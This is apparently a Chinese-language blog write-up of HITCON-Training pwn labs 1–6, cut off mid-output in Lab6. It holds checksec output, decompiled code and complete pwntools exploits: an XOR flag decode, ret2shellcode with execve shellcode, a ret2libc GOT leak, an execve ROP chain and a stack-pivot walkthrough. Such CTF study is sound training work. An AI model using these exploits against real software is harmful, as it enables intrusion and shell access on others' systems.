title=\"Lab1——sysmagic\"></a>Lab1——sysmagic</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab1/sysmagic&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>程序要求输入一个magic，然后就直接退出。用IDA看一下：</p>\n<p>在函数get_flag中直接要求读入到栈上v2处（ebp+0x7c），如果v2和随机数buf相等，则直接打印出栈上的flag。buf在(ebp+0x80处)。不过貌似没有较好的溢出方法，不过这实际上是一道逆向题，通过逆向可以直接找到答案。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"> read(fd, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me maigc :\"</span>);</span><br><span class=\"line\"> __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( buf == v2 )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x30</span>; ++i )</span><br><span class=\"line\">     <span class=\"built_in\">putchar</span>((<span class=\"keyword\">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>观察汇编代码，还原两个字符串，然后按位异或即可找到flag。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str1 = &apos;\\x44\\x6f\\x5f\\x79\\x6f\\x75\\x5f\\x6b&apos;</span><br><span class=\"line\">str1 += &apos;\\x6e\\x6f\\x77\\x5f\\x77\\x68\\x79\\x5f&apos;</span><br><span class=\"line\">str1 += &apos;\\x6d\\x79\\x5f\\x74\\x65\\x61\\x6d\\x6d&apos;</span><br><span class=\"line\">str1 += &apos;\\x61\\x74\\x65\\x5f\\x4f\\x72\\x61\\x6e&apos;</span><br><span class=\"line\">str1 += &apos;\\x67\\x65\\x5f\\x69\\x73\\x5f\\x73\\x6f&apos;</span><br><span class=\"line\">str1 += &apos;\\x5f\\x61\\x6e\\x67\\x72\\x79\\x3f\\x3f\\x3f&apos;</span><br><span class=\"line\">str2 = &apos;\\x07\\x3b\\x19\\x02\\x0b\\x10\\x3d\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x08\\x12\\x2d\\x28\\x59\\x0a\\x00\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x16\\x00\\x04\\x55\\x16\\x08\\x1f\\x07\\x01&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x00\\x7e\\x1c\\x3e\\x0a\\x1e\\x0b\\x6b&apos;</span><br><span class=\"line\">str2 += &apos;\\x04\\x42\\x3c\\x2c\\x5b\\x31\\x55\\x02\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x21\\x10\\x4c\\x1e\\x42&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">flag = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(len(str1)):</span><br><span class=\"line\">\tflag += chr(ord(str1[i]) ^ ord(str2[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">print flag</span><br><span class=\"line\"></span><br><span class=\"line\">CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</span><br><span class=\"line\">[Finished in 0.1s]</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab2——orw\"><a href=\"#Lab2——orw\" class=\"headerlink\" title=\"Lab2——orw\"></a>Lab2——orw</h2><p>是手写汇编的练习，略。</p>\n<h2 id=\"Lab3——ret2shellcode\"><a href=\"#Lab3——ret2shellcode\" class=\"headerlink\" title=\"Lab3——ret2shellcode\"></a>Lab3——ret2shellcode</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>未开启任何防护</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab3$ checksec ret2sc</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab3/ret2sc&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>顾名思义，该题是用ret2sc的方法。main函数中首先从stdin读入，往bss段上写了0x32字节，然后栈溢出返回到刚刚写的地址即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [esp+1Ch] [ebp-14h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Name:\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;name, <span class=\"number\">0x32</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Try your best:\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)gets(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2sc\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./ret2sc\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># ref: https://www.exploit-db.com/shellcodes/41630</span></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\xeb\\x10\\x5e\\x31\\xc9\\xb1\\x15\\x8a\\x06\\x34\\xe9\\x88\\x06\\x46\\xe2\\xf7\\xeb\\x05\\xe8\\xeb\\xff\\xff\\xff\\xd8\\x20\\xb8\\x81\\xc6\\xc6\\x9a\\x81\\x81\\xc6\\x8b\\x80\\x87\\x60\\x0a\\x83\\xe2\\xb1\\x70\\x24\\x69\"</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x804a060</span></span><br><span class=\"line\">offset = <span class=\"number\">0x1c</span> + <span class=\"number\">4</span></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Name:\"</span>, shellcode)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Try your best:\"</span>, offset *<span class=\"string\">\"a\"</span> + p32(bss_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab4——ret2lib\"><a href=\"#Lab4——ret2lib\" class=\"headerlink\" title=\"Lab4——ret2lib\"></a>Lab4——ret2lib</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>开启了NX，无法使用ret2sc。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab4$ checksec ret2lib</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab4/ret2lib&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>程序首先会主动leak出任意地址，可以通过这一点leak got表获取libc的加载基址，然后构造rop链即可。</p>\n<p>注意在Print_message中dest离eip的偏移为0x38 + 4</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> **v3; <span class=\"comment\">// ST04_4</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> src; <span class=\"comment\">// [esp+12h] [ebp-10Eh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+112h] [ebp-Eh]</span></span><br><span class=\"line\">  _DWORD *v8; <span class=\"comment\">// [esp+11Ch] [ebp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"###############################\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Do you know return to library ?\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"###############################\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What do you want to see in memory?\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me an address (in dec) :\"</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0xA</span>u);</span><br><span class=\"line\">  v8 = (_DWORD *)strtol(&amp;buf, v3, v4);</span><br><span class=\"line\">  See_something(v8);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Leave some message for me :\"</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;src, <span class=\"number\">0x100</span>u);</span><br><span class=\"line\">  Print_message(&amp;src);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Thanks you ~\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2lib\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./ret2lib\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">p.send(str(elf.got[<span class=\"string\">'__libc_start_main'</span>]))</span><br><span class=\"line\">addr = int(p.recvline().split(<span class=\"string\">\": \"</span>)[<span class=\"number\">-1</span>].strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">write = libc.symbols[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr = <span class=\"number\">0x8048570</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x38</span> + <span class=\"number\">4</span></span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(main_addr)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"for me :\"</span>, rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab5——simplerop\"><a href=\"#Lab5——simplerop\" class=\"headerlink\" title=\"Lab5——simplerop\"></a>Lab5——simplerop</h2><h3 id=\"防护-3\"><a href=\"#防护-3\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab5$ checksec simplerop</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab5/simplerop&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>直接栈溢出。不过该题是静态链接的，没有加载libc.so，并且题目中没有system，所以需要手动构造ROP链，利用系统调用sys_execve执行利用。</p>\n<p>首先要把参数写到相应的寄存器，然后执行int 0x80</p>\n<ul>\n<li>系统调用号存入EAX（execve的为11）</li>\n<li>通过ebx,ecx,edx,esi,edi等传递参数</li>\n<li>最后调用int 0x80</li>\n</ul>\n<p>这里要用到ROPgadget工具，来搜索可用的gadget。主要就是一些pop|ret和int 0x80的gadget。</p>\n<p>另外，题目中没有现成的/bin/sh字符串，需要首先写入。我采用的是调用静态链接进来的read函数，写入到bss段。官方writeup中采用了一种更为巧妙的方法，使用如下的gadget</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov dword ptr [edx], eax ;</span><br><span class=\"line\">ret ;</span><br></pre></td></tr></table></figure>\n<p>通过<code>pop eax;ret pop edx; ret</code>将字符串四位四位的写到data段（或bss段）。可以看到这种方法的通用性更强。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#write to memory</span></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span>*<span class=\"number\">32</span></span><br><span class=\"line\">payload += p32(pop_edx_ret)</span><br><span class=\"line\">payload += p32(buf)</span><br><span class=\"line\">payload += p32(pop_eax_ret)</span><br><span class=\"line\">payload += <span class=\"string\">\"/bin\"</span></span><br><span class=\"line\">payload += p32(gadget)</span><br><span class=\"line\">payload += p32(pop_edx_ret)</span><br><span class=\"line\">payload += p32(buf+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(pop_eax_ret)</span><br><span class=\"line\">payload += <span class=\"string\">\"/sh\\x00\"</span></span><br><span class=\"line\">payload += p32(gadget)</span><br></pre></td></tr></table></figure>\n<p>我的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./simplerop\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./simplerop\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">int80 = <span class=\"number\">0x080493e1</span></span><br><span class=\"line\">popecx_popebx = <span class=\"number\">0x0806e851</span></span><br><span class=\"line\">popeax = <span class=\"number\">0x080bae06</span></span><br><span class=\"line\">popedx = <span class=\"number\">0x0806e82a</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x80ec2c0</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x8048e24</span></span><br><span class=\"line\">read = <span class=\"number\">0x806cd50</span></span><br><span class=\"line\">offset = <span class=\"number\">0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(read)</span><br><span class=\"line\">rop += p32(main_addr)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p32(bss_addr)</span><br><span class=\"line\">rop += p32(<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">rop = (offset - <span class=\"number\">8</span>) * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(popeax)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xb</span>)</span><br><span class=\"line\">rop += p32(popecx_popebx)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) + p32(bss_addr)</span><br><span class=\"line\">rop += p32(popedx)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p32(int80)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab6——migration\"><a href=\"#Lab6——migration\" class=\"headerlink\" title=\"Lab6——migration\"></a>Lab6——migration</h2><h3 id=\"防护-4\"><a href=\"#防护-4\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab6$ checksec migration</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab6/migration&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题溢出的字节较少，而又需要leak libc，构造利用链，所以显然栈空间是不够的；但是又不能先布置shellcode，再<code>jmp esp</code>跳到shellcode执行，所以需要考虑其他方法。根据题目名字的提示，应该是用栈迁移的方法。</p>\n<p>用ROPgadget搜索，注意到以下gadget</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x08048418 : leave ; ret</span><br></pre></td></tr></table></figure>\n<p>我们通过溢出将栈布局为如下格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">buffer padding | fake ebp | leave ret addr|</span><br></pre></td></tr></table></figure>\n<ul>\n<li>函数的返回地址被覆盖为leave_ret的地址，这样在函数执行完自己的leave_ret后还会在执行一次leave_ret。当函数执行完自己的leave时，ebp为fake ebp的值，即指向ebp2；当函数再执行自己的ret的时候，会执行leave_ret，先令esp也指向ebp2，然后将fake ebp处的第一个4bytes pop给ebp，即将ebp的值修改为ebp2，然后执行ret，将fake ebp后的第二个4bytes所存的地址给eip，即将eip的值修改为target function addr。</li>\n<li>如果调用的是函数，则函数入口点首先会调用push ebp，就会将ebp2的值压栈；然后调用mov ebp，esp，ebp指向当前基地址。</li>\n<li>由上可知，我们fake ebp处假的栈桢结构如下：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake ebp</span><br><span class=\"line\"></span><br><span class=\"line\">ebp2 | target function addr | leave ret addr | arg1 | arg2</span><br></pre></td></tr></table></figure>\n<ul>\n<li>当程序在执行完target function之后，会再执行两次leave_ret，如果我们在ebp2处也布置好了对应的内容，就可以一直控制程序的执行流程</li>\n</ul>\n<p>我们需要一块可以写的内存，并且我们还知道这块内存的地址。所以通过gdb调试可以看出，由于未开启PIE，elf文件所加载的地址我们是知道的，而这其中可读可写的段有0x804a000~0x804b000，在这0x1000个bytes中找一块内存区域即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\">0x08048000 0x08049000 0x00000000 r-x /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0x08049000 0x0804a000 0x00000000 r-- 